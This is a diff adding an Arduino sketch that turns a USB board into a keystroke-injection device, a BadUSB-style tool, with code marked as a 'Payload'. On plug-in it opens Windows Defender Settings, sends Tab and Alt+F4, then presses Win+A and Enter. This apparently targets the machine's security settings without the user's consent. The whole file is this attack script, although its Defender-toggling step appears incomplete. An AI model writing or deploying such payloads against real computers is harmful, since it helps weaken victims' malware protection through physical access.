@@ -1,0 +1,70 @@
+#include <HID-Project.h>
+#include <HID-Settings.h>
+
+// Utility function
+void typeKey(int key){
+  Keyboard.press(key);
+  delay(50);
+  Keyboard.release(key);
+}
+
+void setup()
+{
+  // Start Keyboard and Mouse
+  AbsoluteMouse.begin();
+  Keyboard.begin();
+
+  // Start Payload
+  delay(2000);
+
+  typeKey(KEY_ESC);
+
+  delay(100);
+
+  Keyboard.press(KEY_LEFT_CTRL);
+  Keyboard.press(KEY_ESC);
+  Keyboard.releaseAll();
+
+  delay(100);
+
+  Keyboard.print("Windows Defender Settings");
+
+  typeKey(KEY_RETURN);
+
+  delay(2000);
+
+  typeKey(KEY_TAB);
+
+  delay(50);
+
+  delay(50);
+
+  Keyboard.press(KEY_LEFT_ALT);
+  Keyboard.press(KEY_F4);
+  Keyboard.releaseAll();
+
+  delay(3200);
+
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press(97);
+  Keyboard.releaseAll();
+
+  delay(500);
+
+  typeKey(KEY_RETURN);
+
+  delay(100);
+
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press(97);
+  Keyboard.releaseAll();
+
+  // End Payload
+
+  // Stop Keyboard and Mouse
+  Keyboard.end();
+  AbsoluteMouse.end();
+}
+
+// Unused
+void loop() {}
